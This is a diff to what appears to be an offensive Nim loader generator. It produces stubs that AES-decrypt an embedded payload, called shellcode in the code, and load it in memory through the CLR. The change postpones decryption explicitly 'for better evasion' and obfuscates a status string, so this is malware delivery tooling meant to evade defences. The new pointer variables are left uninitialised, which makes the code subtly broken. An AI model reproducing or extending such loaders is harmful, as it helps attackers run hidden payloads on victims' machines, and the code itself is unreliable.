@@ -767,6 +767,10 @@ from winim/clr import toCLRVariant,invoke,load,`.`,VT_BSTR
 """
 
 let LoadAssemblyStub = fmt"""
+
+# Actually decrypt after doing everything else for better evasion.
+decryptlate()
+
 var assembly = load(dectext)
 
 from os import paramCount,paramStr
@@ -934,7 +938,7 @@ func toByteSeq*(str: string): seq[byte] {.inline.} =
   ## Converts a string to the corresponding byte sequence.
   @(str.toOpenArrayByte(0, str.high))
 
-var ectx: ECB[aes256]
+var dctx: ECB[aes256]
 
 """
 
@@ -958,10 +962,23 @@ if ((len(expandedkey) mod aes256.sizeBlock) != 0):
 
 copyMem(addr key[0], addr expandedkey[0], len(expandedkey))
 var dectext = newSeq[byte](len(enctext))
+
+var ptrKey = cast[ptr byte](addr key[0])
+var ptrEncText: ptr byte # = cast[ptr byte](addr encText[0])
+var ptrDecText: ptr byte # = cast[ptr byte](addr decText[0])
+let dataLen = uint(len(enctext))
+
 # Decrypt
-ectx.init(key)
-ectx.decrypt(enctext, dectext)
-ectx.clear()
+#dctx.init(ptrKey)
+#dctx.decrypt(ptrEncText, ptrDecText, dataLen)
+#dctx.clear()
+
+proc decryptLate(): void =
+    when defined(verbose):
+        echo obf("[!] Decrypting Shellcode for execution in memory")
+    dctx.init(ptrKey)
+    dctx.decrypt(ptrEncText, ptrDecText, dataLen)
+    dctx.clear()
 
 """
 
